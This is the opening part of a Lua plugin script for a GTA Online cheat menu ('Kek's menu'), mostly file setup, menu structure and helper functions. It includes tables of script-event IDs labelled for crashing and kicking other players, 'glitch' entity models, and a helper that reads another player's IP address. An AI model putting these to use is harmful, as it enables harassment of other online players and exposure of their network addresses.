-- Kek's menu version 0.3.9.1
-- FOR BEST EXPERIENCE, REVIEW CODE WITH SUBLIME TEXT 3
-- You're not allowed to copy-paste and publish code from this script without my permission.
-- If you find any bugs, please message me on discord: Kektram#8996

-- Checks if kek is open
	if is_keks_menu_loaded then 
		ui.notify_above_map("~h~~d~Kek's menu is already loaded! Intentional error.", "Initialization cancelled.", 211) 
		error("Keks menu was already loaded!")
	end
	is_keks_menu_loaded = "0.3.9.1"
	math.randomseed(os.clock() + os.time())
	for i = 1, math.random(100, 10000) do
		local e = math.random(1, 2)
	end

-- Validity check and file Initialization
	-- Tables of everything
		local u = {} --  feature table
		local o = {} --  misc stuff
		local temp = {} -- Used on temp vars 
		local txt = {} -- Text
		local toggle = {} -- Toggle settings
		local valuei = {} -- Slider settings

	-- File paths
		o.home = utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\"
		o.kek_menu_stuff_path = o.home.."scripts\\kek_menu_stuff\\"

	-- Library versions
		local lib_versions =
		{
			"1.1.2", -- Vehicle mapper
			"1.0.6", -- Ped mapper
			"1.0.6", -- Object mapper 
			"1.1.2", -- Globals
			"1.0.1", -- Weapon mapper
			"0.1.1", -- Location mapper 
			"1.0.1" -- Key mapper
		}

-- Vital functions
	-- File open-read-close
		local function get_file_string(path, type, not_wait)
			if utils.file_exists(o.home..path) then
				local file = io.open(o.home..path)
				if file then
					local str = file:read(type)
					file:close()
					return str, true
				else
					print("FAILED TO OPEN "..path)
					return
				end
			end
			print(path.. " Doesn't exist.")
			return ""
		end

	-- Search for file
		local function get_file(path, file_extension, match, name, not_exact)
			for i, file_name in pairs(utils.get_all_files_in_directory(o.home..path, file_extension)) do
				local c = o.home..path..file_name
				if c ~= "autoexec.lua" then
					local B, K = get_file_string(path..file_name, "*l"), file_name:lower()
					if (not name and B:find(match)) or (not not_exact and name == K) or (not_exact and K:find(name:gsub(file_extension, ""))) then
						return {c, file_name, path..file_name}
					end
				end
			end
			return {nil, nil}
		end

-- language init
	if not utils.file_exists(o.kek_menu_stuff_path.."kekMenuLibs\\Languages\\language.ini") then
		local file = io.open(o.kek_menu_stuff_path.."kekMenuLibs\\Languages\\language.ini", "w+")
		file:close()
	end
	if not utils.file_exists(o.kek_menu_stuff_path.."kekMenuLibs\\Languages\\English.txt") then
		ui.notify_above_map("Missing english language file. Please reinstall kek's menu.", "", 6)
		error("Missing english language file. Please reinstall kek's menu.")
	end
	local language = {}
	local english_default_language = get_file_string("scripts\\kek_menu_stuff\\kekMenuLibs\\Languages\\English.txt", "*a")
	if english_default_language:match("§Version§ (.*) /;/DO NOT CHANGE THIS VALUE|_|") ~= is_keks_menu_loaded then
		ui.notify_above_map("English language file is outdated. Please reinstall kek's menu.", "", 6)
		error("English language file is outdated. Please reinstall kek's menu.")
	end
	local what_language = get_file_string("scripts\\kek_menu_stuff\\kekMenuLibs\\Languages\\language.ini", "*l")	
	local your_chosen_language
	if not what_language or what_language == "" or what_language == "English.txt" or not utils.file_exists(o.kek_menu_stuff_path.."kekMenuLibs\\Languages\\"..what_language) then
		your_chosen_language = english_default_language
		what_language = "English.txt"
	else
		your_chosen_language = get_file_string("scripts\\kek_menu_stuff\\kekMenuLibs\\Languages\\"..what_language, "*a")
	end
	print("\n\n\n")
	if what_language ~= "English.txt" then
		local Temp = 0
		for language_entry in your_chosen_language:gmatch("([^\n]*)\n?") do
			local temp_entry = language_entry:match("|_|(.*)"):gsub("%s", "")
			Temp = Temp + 1
			if temp_entry and #temp_entry > 0 then
				local str = language_entry:match("|_|(.*)")
				str = str:gsub("\\n", "\n")
				str = str:gsub("\\\\\"", "\\\"")
				language[language_entry:match("(.*)|_|").."|_|"] = str
			end
		end
	end
	your_chosen_language = nil
	local Temp = 0
	for language_entry in english_default_language:gmatch("([^\n]*)\n?") do
		Temp = Temp + 1
		if Temp > 1 and not language[language_entry:match("(.*)|_|").."|_|"] then
			if what_language ~= "English.txt" then
				print("Failed to init language entry. Entry is set to english. Around line "..Temp.." in english file.")
			end
			local str = language_entry:match("(.*) /;/")
			str = str:gsub("\\n", "\n")
			str = str:gsub("\\\\\"", "\\\"")
			language[language_entry:match("(.*)|_|").."|_|"] = str
		end
	end
	english_default_language = nil

-- Validity check
	-- Directories & files
		for i, k in pairs({"", "kekMenuData", "profiles", "kekMenuLogs", "kekMenuLibs", "Player stats", "Player history", "kekMenuLibs\\Languages"}) do
			if not utils.dir_exists(o.kek_menu_stuff_path..k) then
				utils.make_dir(o.kek_menu_stuff_path..k)
			end
		end

		local Temp = {"kek_vehicle_mapper", "kek_ped_mapper", "kek_object_mapper", "kek_globals", "kek_weapon_mapper", "kek_location_mapper", "kek_key_mapper"}
		for i, k in pairs(Temp) do
			if not utils.file_exists(o.kek_menu_stuff_path.."kekMenuLibs\\"..k..".lua") then
				ui.notify_above_map(language["You're missing a file in kekMenuLibs. Please reinstall Kek's menu. /;/msg|_|"].."", "", 6)
				error(language["You're missing a file in kekMenuLibs. Please reinstall Kek's menu. /;/msg|_|"])
			end
			local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuLibs\\"..k..".lua", "*l")
			if str:match(": (.*)") ~= lib_versions[i] then
				ui.notify_above_map(language["There's a library file which is the wrong version, please reinstall kek's menu. /;/msg|_|"].."", "", 6)
				error(language["There's a library file which is the wrong version, please reinstall kek's menu. /;/msg|_|"])
			end
		end

		local Temp = {"kekMenuData\\profile names.ini", "kekMenuData\\custom_chat_judge_data.txt", "kekMenuLogs\\Blacklist.log", "kekMenuData\\Kek's chat bot.txt", "kekMenuData\\Spam text.txt", "kekMenuLogs\\All players.log"}
		for i, k in pairs(Temp) do
			if not utils.file_exists(o.kek_menu_stuff_path..k) then
				local file = io.open(o.kek_menu_stuff_path..k, "w")
				file:flush()
				file:close()
			end
		end

		local function Temp()
			local file = io.open(o.kek_menu_stuff_path.."kekMenuData\\profile names.ini", "w+")
			for i = 1, 10 do
				file:write("&|<<>.,Profile "..i.."&|<<>.,"..math.random(0, math.pow(2, 62)).."\n")
			end
			file:flush()
			file:close()
		end
		local STR = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\profile names.ini", "*l")
		if STR then
			local e = 0
			local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\profile names.ini", "*a")
			for profile_name_from_file in str:gmatch("([^\n]*)\n?") do
				if not profile_name_from_file:match("&|<<>.,(.*)&|<<>.,") then
					Temp()
					ui.notify_above_map(language["Something was wrong with the profiles names. Names set to default. /;/msg|_|"].."", "", 212)
					break
				end
				e = e + 1
			end
			if e ~= 10 then
				Temp()
				ui.notify_above_map(language["Something was wrong with the profiles names. Names set to default. /;/msg|_|"].."", "", 212)
			end
		else
			Temp()
		end

	-- Libraries
		--Load all libraries
			package.path = o.kek_menu_stuff_path.."kekMenuLibs\\?.lua"

			-- Made by Kektram
				local weapon_mapper = require("kek_weapon_mapper")
				local location_mapper = require("kek_location_mapper")
				local key_mapper = require("kek_key_mapper")

			-- Originally made by Sai, edited by Kektram
				local globals = require("kek_globals")

			-- Originally made by QuickNET, edited by Kektram
				local vehicle_mapper = require("kek_vehicle_mapper")

				local pedestrian_mapper = require("kek_ped_mapper")

				local object_mapper = require("kek_object_mapper")

-- misc vars
	local selected_players_for_vehicle_blacklist = {}
	local selected_players_for_chat_judger = {}
	local selected_players_for_echo_chat = {}
	local setting = {}
	local setting_names = {}
	local otr_table = {}
	local people_stat_detected = {}
	local blocking_objects = {}
	local hotkey_features = {}
	local hotkey_control_keys_update = true
	temp.your_vehicle_entity_ids = {}
	txt.what_object = "?"

-- User interface(parents)
	-- Global
		u.kekMenu = menu.add_feature(language["Kek's menu /;/parent|_|"], "parent", 0)
		u.settingsUI = menu.add_feature(language["General settings /;/parent|_|"], "parent", u.kekMenu.id)
		u.gvehicle = menu.add_feature(language["Vehicle /;/parent|_|"], "parent", u.kekMenu.id)
		u.vehicle_friendly = menu.add_feature(language["Vehicle peaceful /;/parent|_|"], "parent", u.gvehicle.id)
		u.vehicle_trolling = menu.add_feature(language["Vehicle trolling /;/parent|_|"], "parent", u.gvehicle.id)
		u.vehicle_blacklist = menu.add_feature(language["Vehicle blacklist /;/parent|_|"], "parent", u.gvehicle.id)
		u.session_malicious = menu.add_feature(language["Session malicious /;/parent|_|"], "parent", u.kekMenu.id)
		u.block_areas = menu.add_feature(language["Block areas /;/parent|_|"], "parent", u.session_malicious.id)
		u.player_history = menu.add_feature(language["Player history /;/parent|_|"], "parent", u.kekMenu.id)
		u.session_script_stuff = menu.add_feature(language["Scripts /;/parent|_|"], "parent", u.session_malicious.id)
		u.session_m_settings = menu.add_feature(language["Settings /;/parent|_|"], "parent", u.session_malicious.id)
		u.chat_stuff = menu.add_feature(language["Chat /;/parent|_|"], "parent", u.kekMenu.id)
		u.custom_chat_judger = menu.add_feature(language["Custom chat judger /;/parent|_|"], "parent", u.chat_stuff.id)
		u.chat_bot = menu.add_feature(language["Chat bot /;/parent|_|"], "parent", u.chat_stuff.id)
		u.chat_spammer = menu.add_feature(language["Chat spamming /;/parent|_|"], "parent", u.chat_stuff.id)
		u.notifSettings = menu.add_feature(language["Notification settings /;/parent|_|"], "parent", u.settingsUI.id)
		u.hotkey_settings = menu.add_feature(language["Hotkey settings /;/parent|_|"], "parent", u.settingsUI.id)
		u.modder_detection = menu.add_feature(language["Modder detection /;/parent|_|"], "parent", u.kekMenu.id)
		u.blacklist = menu.add_feature(language["Blacklist /;/parent|_|"], "parent", u.modder_detection.id)
		u.what_to_do_with_tags = menu.add_feature(language["What to do with modders /;/parent|_|"], "parent", u.modder_detection.id)
		u.protections = menu.add_feature(language["Protections /;/parent|_|"], "parent", u.modder_detection.id)
		u.flagsTolog = menu.add_feature(language["Modder logging settings /;/parent|_|"], "parent", u.modder_detection.id)
		u.flagsToUnmark = menu.add_feature(language["Modder unmark settings /;/parent|_|"], "parent", u.modder_detection.id)
		u.flagsToKick = menu.add_feature(language["Auto kick tag settings /;/parent|_|"], "parent", u.modder_detection.id)
		u.modder_detection_settings = menu.add_feature(language["Which modder detections are on /;/parent|_|"], "parent", u.modder_detection.id)
		u.kek_utilities = menu.add_feature(language["Kek's utilities /;/parent|_|"], "parent", u.kekMenu.id)
		u.script_loader = menu.add_feature(language["Script loader /;/parent|_|"], "parent", u.kekMenu.id)
		u.profiles = menu.add_feature(language["Settings /;/parent|_|"], "parent", u.kekMenu.id)
		u.language_config = menu.add_feature(language["Language configuration /;/parent|_|"], "parent", u.kekMenu.id)
		u.self_options = menu.add_feature(language["Self options /;/parent|_|"], "parent", u.kekMenu.id)
		u.vehicle_self = menu.add_feature(language["Vehicle /;/parent|_|"], "parent", u.self_options.id)
		u.vehicleSettings = menu.add_feature(language["Vehicle settings /;/parent|_|"], "parent", u.vehicle_self.id)
		u.weapons_self = menu.add_feature(language["Weapons /;/parent|_|"], "parent", u.self_options.id)

	-- Player
		u.kekMenuP = menu.add_player_feature(language["Kek's menu /;/player parent|_|"], "parent", 0).id
		u.player_vehicle_features = menu.add_player_feature(language["Vehicle /;/player parent|_|"], "parent", u.kekMenuP).id
		u.pWeapons = menu.add_player_feature(language["Weapons /;/player parent|_|"], "parent", u.kekMenuP).id
		u.player_trolling_features = menu.add_player_feature(language["Trolling /;/player parent|_|"], "parent", u.kekMenuP).id
		u.player_chat_features = menu.add_player_feature(language["Chat /;/player parent|_|"], "parent", u.kekMenuP).id
		u.pMalicious = menu.add_player_feature(language["Malicious /;/player parent|_|"], "parent", u.kekMenuP).id
		u.p_utilities = menu.add_player_feature(language["Player utilities /;/player parent|_|"], "parent", u.kekMenuP).id
		u.player_blacklist_features = menu.add_player_feature(language["Blacklist /;/player parent|_|"], "parent", u.kekMenuP).id
		u.script_stuff = menu.add_player_feature(language["Scripts /;/player parent|_|"], "parent", u.kekMenuP).id
		u.p_peds = menu.add_player_feature(language["Pedestrian /;/player parent|_|"], "parent", u.kekMenuP).id

-- Useful functions
	-- Is any true
		function table.is_any_true(Table, conditions)
			for i = 1, #Table do
				if conditions(Table[i]) then
					return true
				end
			end
		end

	-- Is all true
		function table.is_all_true(Table, conditions)
			for i = 1, #Table do
				if not conditions(Table[i]) then
					return
				end
			end
			return true
		end

	-- Replace special characters
		function string.replace_special_characters(str)
			str = tostring(str)
			str = str:gsub("%+", "_")
			str = str:gsub("%-", "_")
			str = str:gsub("%?", "_")
			str = str:gsub("%*", "_")
			return str
		end

	-- Sort a table from highest to lowest
		function table.sort_numbers(t)
			local function get_num(entry)
				entry = entry:gsub("%c", "")
				entry = entry:gsub("%p", "")
				entry = entry:gsub("%s", "")
				entry = entry:gsub("%a", "")
				return tonumber(entry)
			end
			table.sort(t, function(a, b) return get_num(a) > get_num(b) end)
			return t
		end

	-- Round a number
		function math.round(num)
			if tonumber(num) then
				local floor = math.floor(num)
				if floor >= num - 0.4999999999 then
					return floor
				else
					return math.ceil(num)
				end
			end
		end

	-- Find toggle
		local function find_and_toggle_on_or_off_toggle(text, is_toggle_on)
			if not setting[text] then
				for i, feature_toggle in pairs(toggle) do
					if feature_toggle[1] == text then
						feature_toggle[2].on = is_toggle_on
						break
					end
				end
			end
		end

	-- Random wait for intense loops
		local function random_wait(t)
			local t = math.ceil(t)
			if t < 1 then
				t = 1
			end
			if math.random(1, t) == 1 then
				system.yield(0)
			end
		end 

	-- Get text reversed
		function string.get_lines_reversed(path)
			local str = get_file_string(path, "*a")
			local string_table = {}
			for line in str:gmatch("([^\n]*)\n?") do
				string_table[#string_table + 1] = line
			end
			local new_table = {}
			for i = 1, #string_table do
				new_table[#new_table + 1] = string_table[#string_table - (i - 1)]
				random_wait(100)
			end
			return table.concat(new_table, "\n")
		end

	-- Key function
		local function do_key(group, key, t)
			local time = utils.time_ms() + t
			while controls.is_disabled_control_pressed(group, key) and time > utils.time_ms() do
				system.yield(0)
			end
		end

	-- Messager function
		local function msg(text, color, notifyOn)
			if notifyOn then
				ui.notify_above_map("~h~"..text, language["Kek's menu /;/msg|_|"].." "..setting["Version"].." ~p~¦", color)
			end
		end

	-- Input function
		local function get_input(title, default, len, type, default_return)
			do_key(0, 215, 5000)
			local input_status, text = 1
			while input_status == 1 do
				system.yield(0)
				input_status, text = input.get(title, default, len, type)
			end
			do_key(0, 215, 5000)
			if input_status == 2 or #tostring(text) == 0 then
				if default_return then
					return default_return, false, input_status
				else
					return "", false, input_status
				end
			end
			return text, true
		end

	-- Slider I/O
		local function value_i_setup(feature, value_i_int)
			local value_i_int = tonumber(value_i_int)
			if value_i_int then 
				if value_i_int < feature.min_i then
					feature.value_i = feature.min_i
				elseif feature.max_i >= value_i_int then
					feature.value_i = value_i_int
				else
					feature.value_i = feature.max_i
				end
			end
		end

		local function player_value_i_init(f, max, min, mod, value_i)
			for pid = 1, 32 do
				if max then
					f.feats[pid].max_i = max
				end
				if min then
					f.feats[pid].min_i = min
				end
				if mod then
					f.feats[pid].mod_i = mod
				end
				if value_i then
					f.feats[pid].value_i = value_i
				end
			end
		end

	-- Get IP
		local function get_ip_in_ipv4(pid)
			local ip = player.get_player_ip(pid)
			return string.format("%i.%i.%i.%i", ip >> 24 & 255, ip >> 16 & 255, ip >> 8 & 255, ip & 255)
		end

	-- Ipv4 to dec
		local function ipv4_to_dec(ip)
			if ip:find(".") then
				return ip
			end
			local dec = 0; 
			for d in string.gmatch(ip, "%d+") do 
				dec = d + bit32.lshift(dec, 8) 
			end;
			if not math.ceil(dec) then 
				return ""
			else
				return math.ceil(dec) 
			end
		end

		local function dec_to_hex(num)
            return string.format("%x", num)
		end

	-- Search for match in file
		local function search_for_match_and_get_line(file_name, text_to_search_for_match_for, match_has_to_be_exact, cannot_yield)
			for line in get_file_string(file_name, "*a"):gmatch("([^\n]*)\n?") do
				for i, text in pairs(text_to_search_for_match_for) do
					if not cannot_yield then
						random_wait(210)
					end
					local text_without_special_char = string.replace_special_characters(tostring(text))
					local line_without_special_char = string.replace_special_characters(line) 
					if text_without_special_char == line_without_special_char or (not match_has_to_be_exact and line_without_special_char:find(text_without_special_char)) then
						return line, text
					end
				end
			end
		end

	-- Log / check if already in file
		local function log(file_name, text_to_log, text_to_search_for_match_for, match_has_to_be_exact)
			if text_to_search_for_match_for then
				local line_from_text_file = search_for_match_and_get_line(file_name, text_to_search_for_match_for, match_has_to_be_exact, true)
				if line_from_text_file then
					return line_from_text_file
				end
			end
    		local file = io.open(o.home..file_name, "a+")
    		if file then
	    		file:write(text_to_log.."\n")
	    		file:flush()
	    		file:close()
	    	else
	    		print("FAILED TO LOG TO "..file_name)
	    	end
	    end

	-- Get index of table value
		function table.get_index_of_value(table, value_to_find_index_of)
			for index = 1, #table do
				if table[index] == value_to_find_index_of then
					return index
				end
			end
		end

	-- Merge 2 tables 
		function table.merge(parent_table, children_tables)
			for which_table_index = 1, #children_tables do
				for i = 1, #children_tables[which_table_index] do
					parent_table[#parent_table + 1] = children_tables[which_table_index][i]
				end
			end
			return parent_table
		end

	-- Remove / replace a value from file
		local function modify_entry(file_name, text_to_remove_or_modify, match_has_to_be_exact, replace_text, duplicate_protection, cannot_yield)
			if utils.file_exists(o.home..file_name) then
				if search_for_match_and_get_line(file_name, text_to_remove_or_modify, match_has_to_be_exact, true) then
					local str = get_file_string(file_name, "*a")
					local rand = o.kek_menu_stuff_path.."kekMenuData\\temp_"..math.random(1, math.pow(2, 62))..".log"
					local file = io.open(rand, "w+")
					for line in str:gmatch("([^\n]*)\n?") do
						for i, text in pairs(text_to_remove_or_modify) do
							if line == "" then
								file:write(line.."\n")
								break
							end
							text = string.replace_special_characters(tostring(text))
							local line_without_special_chars = string.replace_special_characters(tostring(line))
							local replace_text_without_special_char = string.replace_special_characters(text_to_remove_or_modify[i])
							if not replace_text and (line_without_special_chars == text or (not match_has_to_be_exact and line_without_special_chars:find(text))) then
								break
							elseif replace_text and math.floor(i / 2) ~= i / 2 and (line_without_special_chars == replace_text_without_special_char or (not match_has_to_be_exact and line_without_special_chars:find(replace_text_without_special_char))) then
								if duplicate_protection then
									file:write("&|<<>.,"..text_to_remove_or_modify[i + 1].."&|<<>.,"..math.random(0, math.pow(2, 62)).."\n")
								else
									file:write(text_to_remove_or_modify[i + 1].."\n")
								end
								break
							end
							if i == #text_to_remove_or_modify then
								file:write(line.."\n")
							end
						end
					end
					file:close()
					local str = get_file_string(rand:gsub(o.home, ""), "*a")
					io.remove(rand)
					local file = io.open(o.home..file_name, "w+")
					file:write(str)
					file:flush()
					file:close()
					return 1
				else
					return 2
				end
			else
				return 3
			end
		end

-- Tables
	-- Scripts
		local crash_script_events =
			{
				-977515445,
				767605081,
				-1730227041
			}

		local kick_script_events =
			{
				-171207973,
				-1212832151,
				1317868303,
				-1252906024,
				-1890951223,
				-1212832151,
				-1559754940,
				-1054826273,
				1620254541,
				1401831542,
				-1491386500
			}

	-- Entities
		local table_of_glitch_entity_models = 
			{
				"prop_ld_dstcover_02",
				"prop_torture_ch_01",
				"prop_ld_farm_rail01",
				"prop_ld_ferris_wheel",
				"prop_alien_egg_01",
				"prop_cs_dildo_01",
				"prop_sh_bong_01",
				"banshee2",
				"molotok",
				"moonbeam2",
				"sanctus",
				"bmx",
				"buzzard2",
				"swift2",
				"a_f_y_hiker_01",
				"a_m_m_genfat_01",
				"a_c_killerwhale",
				"a_c_cat_01",
				"a_c_humpback",
				"a_c_crow"
			}

	-- Initialize modder flag tables
		local keks_custom_modder_flags = 
			{
				{nil, "Has-Suspicious-Stats"}, 
				{nil, "You-sent-malicious"}, 
				{nil, "Blacklist"},
				{nil, "Off-the-radar-too-long"},
				{nil, "Modded-Spectate"},
				{nil, "Modded-Net-Event"},
				{nil, "Modded-Name"},
				{nil, "Modded-Script-Event"}
			}
			
		o.modder_flag_setting_properties = 
			{
				{
					"Log people with ", 
					"log: ", 
					u.flagsTolog,
					language["Log: /;/setting|_|"].." "
				}, 
				{
					"Kick people with ", 
					"kick: ", 
					u.flagsToKick,
					language["Kick: /;/setting|_|"].." "
				}, 
				{
					"Unmark people with ", 
					"Unmark: ", 
					u.flagsToUnmark,
					language["Unmark: /;/setting|_|"].." "
				}
			}

		local modIdStuff = {}
			for i, custom_modder_flag in pairs(keks_custom_modder_flags) do
				for p = 18, 62 do
					local b = math.pow(2, p)
				    if player.get_modder_flag_text(b) == custom_modder_flag[2] then
			        	keks_custom_modder_flags[i][1] = b
			        	modIdStuff[i] = b
			        	break
			    	end
			    end
		    	if not custom_modder_flag[1] then
		    		keks_custom_modder_flags[i][1] = player.add_modder_flag(custom_modder_flag[2])
		    		modIdStuff[i] = keks_custom_modder_flags[i][1]
				end
		    end
		    for int_modder_flag = 0, 17  do
				modIdStuff[#modIdStuff + 1] = 1 << int_modder_flag
			end

	-- General settings
		local general_settings = 
			{
				{"Version", "0.3.9.1"},
				{"Force host", false}, 
				{"Automatically check player stats", true}, 
				{"Auto kicker", false}, 
				{"Log modders", true}, 
				{"Blacklist", true},
				{"Spawn #vehicle# maxed", true, language["Spawn vehicles maxed /;/feature|_|"]}, 
				{"Delete old #vehicle#", true, language["Delete old vehicle /;/feature|_|"]}, 
				{"Custom chat judger", false}, 
				{"Judge selected only", false},
				{"Chat judge reaction", 2}, 
				{"Default vehicle", "krieger"},
				{"Exclude friends from attacks #malicious#", true, language["Exclude friends from attacks /;/feature|_|"]}, 
				{"Spawn inside of spawned #vehicle#", true, language["Spawn inside of spawned vehicle /;/feature|_|"]}, 
				{"Always f1 wheels on #vehicle#", false, language["Always spawn with f1 wheels /;/feature|_|"]}, 
				{"Ram speed", 150}, 
				{"hotkeys", true}, 
				{"Auto kicker #notifications#", true, language["Auto kick modders with selected tags /;/feature|_|"]}, 
				{"Chat judge #notifications#", true, language["Custom chat judge /;/feature|_|"]},
				{"Always ask what #vehicle#", false, language["Always ask what vehicle /;/feature|_|"]}, 
				{"Air #vehicle# spawn mid-air", true, language["Spawn air vehicle mid-air /;/feature|_|"]}, 
				{"Hotkeys #notifications#", true, language["Hotkeys /;/setting|_|"]}, 
				{"Auto unmark", false}, 
				{"Auto tag modders after sending kick #malicious#", true, language["Auto tag modders after sending kick /;/feature|_|"]},   
				{"Plate vehicle text", "Kektram"}, 
				{"Modded stats severity", 3}, 
				{"Vehicle fly speed", 150}, 
				{"Spawn #vehicle# in godmode", false, language["Spawn vehicles in godmode /;/feature|_|"]}, 
				{"OTR detection", true},
				{"Vehicle blacklist", false},
				{"Vehicle blacklist #notifications#", true, language["Vehicle blacklist /;/parent|_|"]},
				{"Reapply bounty automatically", false}, 
				{"Never wanted", false},
				{"10k CEO loop", false},
				{"Block passive", false},
				{"Off-the-radar", false},
				{"Spam text", "Kektram"},
				{"Echo chat", false},
				{"Individual echo", false},
				{"Modded spectate detection", false},
				{"Kick any vote kickers", false},
				{"chat bot", false},
				{"chat bot delay", 300},
				{"Spam speed", 100},
				{"Echo delay", 100},
				{"Entity type", 1},
				{"Player history", true},
				{"History limit", 1500},
				{"Default pedestrian", "a_f_y_topless_01"},
				{"Modded net event detection", false},
				{"Vehicle blacklist apply only on specific players", false},
				{"Modded scid detection", true},
				{"Modded name detection", true},
				{"Random weapon camos", false},
				{"Controller hotkey mode", false},
				{"Max number of people to kick in force host", 7},
				{"Vehicle clear distance", 500},
				{"Ped clear distance", 500},
				{"Object clear distance", 100},
				{"Pickup clear distance", 100},
				{"Modded script event detection", true}
			}

-- Entity functions
	-- Distance between 2 entities
		local function get_distance_between(entity_or_position_1, entity_or_position_2)
			if type(entity_or_position_1) == "number" then
				entity_or_position_1 = entity.get_entity_coords(entity_or_position_1)
			end
			if type(entity_or_position_2) == "number" then 
				entity_or_position_2 = entity.get_entity_coords(entity_or_position_2)
			end
			if type(entity_or_position_1) == "userdata" and type(entity_or_position_2) == "userdata" then
				local distance_between = entity_or_position_1 - entity_or_position_2
				return math.abs(distance_between.x) + math.abs(distance_between.y)
			else
				print("FAILED TO FIND DISTANCE BETWEEN.")
				return 0
			end
		end

	-- Get ped depending on spectate
		local function get_ped_closest_to_your_pov()
			local me = player.player_id()
			local spectate_target = network.get_player_player_is_spectating(me)
			if spectate_target then
				return player.get_player_ped(spectate_target)
			else
				return player.get_player_ped(me)
			end
		end

	-- Get number of peds in a vehicle
		local function get_number_of_passengers(car)
			local passengers, is_there_a_player_in_the_vehicle = {}
			local me = player.player_id()
			for i = -1, vehicle.get_vehicle_max_number_of_passengers(car) - 2 do
				local Ped = vehicle.get_ped_in_vehicle_seat(car, i)
				if entity.is_an_entity(Ped) then
					passengers[#passengers + 1] = Ped
					if ped.is_ped_a_player(Ped) and player.get_player_from_ped(Ped) ~= me then
						is_there_a_player_in_the_vehicle = true
					end
				end
			end
			return passengers, is_there_a_player_in_the_vehicle
		end

	-- Get closest player to your pov
		local function get_closest_player()
			local pids = {}
			local me = player.player_id()
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.get_player_coords(pid).z > -20 and pid ~= me then
					pids[#pids + 1] = pid
				end
			end
			if #pids == 0 then
				pids[1] = me
			end
			local my_ped = get_ped_closest_to_your_pov()
			table.sort(pids, function(a, b) return (get_distance_between(player.get_player_ped(a), my_ped) < get_distance_between(player.get_player_ped(b), my_ped)) end)
			return pids[1]
		end

	-- Get random player except
		local function get_random_player_except(exclusions)
			local pids = {}
			for pid = 0, 31 do
				if player.is_player_valid(pid) and not table.get_index_of_value(exclusions, pid) then
					pids[#pids + 1] = pid
				end
			end
			if #pids > 0 then
				return pids[math.random(1, #pids)]
			else
				return player.player_id()
			end
		end

	-- Get random drivestyle
		local function get_random_drive_style()
			local drivestyle = 0
			for i = 0, 30 do
				if math.random(1, 4) == 1 then
					drivestyle = drivestyle + (1 << i)
				end
			end
			return drivestyle
		end

	-- Get table of entity type
		local function get_table_of_close_entity_type(type)
			if type == 1 then
				return vehicle.get_all_vehicles()
			elseif type == 2 then
				return ped.get_all_peds()
			elseif type == 3 then
				return object.get_all_objects()
			elseif type == 4 then
				return object.get_all_pickups()
			elseif type == 5 then
				return table.merge(vehicle.get_all_vehicles(), {ped.get_all_peds()})
			elseif type == 6 then
				return table.merge(vehicle.get_all_vehicles(), {ped.get_all_peds(), object.get_all_pickups(), object.get_all_objects()})
			end
		end

	-- Request control
		local function get_control_of_entity(entity_to_get_control_of, time_to_wait)
			if not time_to_wait then
				time_to_wait = 550 
			end
			if entity.is_an_entity(entity_to_get_control_of) and not network.has_control_of_entity(entity_to_get_control_of) then
				network.request_control_of_entity(entity_to_get_control_of)
    			local time = utils.time_ms() + time_to_wait
    			while not network.has_control_of_entity(entity_to_get_control_of) and time > utils.time_ms() do
    				network.request_control_of_entity(entity_to_get_control_of)
       				system.yield(0)
    			end
			end
			if entity_to_get_control_of then
				return network.has_control_of_entity(entity_to_get_control_of)
			end
		end

	-- Give entity godmode
		local function modify_entity_godmode(target_entity, toggle_on_god)
			if get_control_of_entity(target_entity) then
				entity.set_entity_god_mode(target_entity, toggle_on_god)
				return entity.get_entity_god_mode(target_entity)
			end
		end

	-- Max vehicle
		local function max_car(car, only_performance_upgrades)
			if entity.is_entity_dead(car) or not get_control_of_entity(car) then 
				return
			end
			vehicle.set_vehicle_mod_kit_type(car, 0)
			if not only_performance_upgrades then
				local e = {}
				for i = 1, 7 do
					local num = math.ceil(math.maxinteger / math.random(1000000, 2000000000))
					e[i] = math.random(num - 4000000000, num)
				end
				vehicle.set_vehicle_number_plate_text(car, setting["Plate vehicle text"])
				if setting["Always f1 wheels on #vehicle#"] then
					vehicle.set_vehicle_wheel_type(car, 10)
				else
					vehicle.set_vehicle_wheel_type(car, math.random(0, 11))
				end
				vehicle.set_vehicle_neon_light_enabled(car, math.random(-1, 4), true)
				vehicle.set_vehicle_tire_smoke_color(car, math.random(0, 255), math.random(0, 255), math.random(0, 255))
				vehicle.set_vehicle_number_plate_index(car, math.random(0, 3))
				vehicle.set_vehicle_fullbeam(car, true)
				vehicle.set_vehicle_custom_wheel_colour(car, e[2])
				vehicle.set_vehicle_neon_lights_color(car, e[3])
				vehicle.set_vehicle_custom_primary_colour(car, e[4])
				vehicle.set_vehicle_custom_secondary_colour(car, e[5])
				vehicle.set_vehicle_extra_colors(car, e[6], e[7])
				if math.random(1, 3) == 1 then
					vehicle.set_vehicle_custom_pearlescent_colour(car, math.random(0, e[7]))
				end
				if math.random(1, 20) == 1 then
					local e = vehicle.get_num_vehicle_mods(car, 48)
					if e > 0 then
						vehicle.set_vehicle_mod(car, 48, math.random(1, e))
					end
				end
				local mods_to_ignore = {11, 12, 16, 18, 48}
				for mod_index = 0, 65 do
					if not table.get_index_of_value(mods_to_ignore, mod_index) then
						local e = vehicle.get_num_vehicle_mods(car, mod_index)
						if e > 0 then
							vehicle.set_vehicle_mod(car, mod_index, math.random(-1, e))
						end
					end
				end
				local hash = entity.get_entity_model_hash(car)
				if hash == 884483972 then
					vehicle.set_vehicle_mod(car, 10, 0)
				elseif hash == 2069146067 then
					vehicle.set_vehicle_mod(car, 10, 1)
				end
				for extra_index = 0, 100 do
					if vehicle.does_extra_exist(car, extra_index) then
						vehicle.set_vehicle_extra(car, extra_index, math.random(0, 1) == 1)
					elseif extra_index > 1 then
						break
					end
				end
			end
			vehicle.set_vehicle_bulletproof_tires(car, true)
			vehicle.set_vehicle_mod(car, 11, 3)
			vehicle.set_vehicle_mod(car, 12, 2)
			vehicle.set_vehicle_mod(car, 16, 4)
			vehicle.set_vehicle_mod(car, 18, 0)
			return HANDLER_CONTINUE
		end

	-- Request model
		local function request_model(model_hash)
			if streaming.is_model_valid(model_hash) then 
				if not streaming.has_model_loaded(model_hash) then
	   				streaming.request_model(model_hash)
	    			local time = utils.time_ms() + 450
	    			while not streaming.has_model_loaded(model_hash) and time > utils.time_ms() do
	       				system.yield(0)
	   				end
				end
			end
			return streaming.has_model_loaded(model_hash)
		end

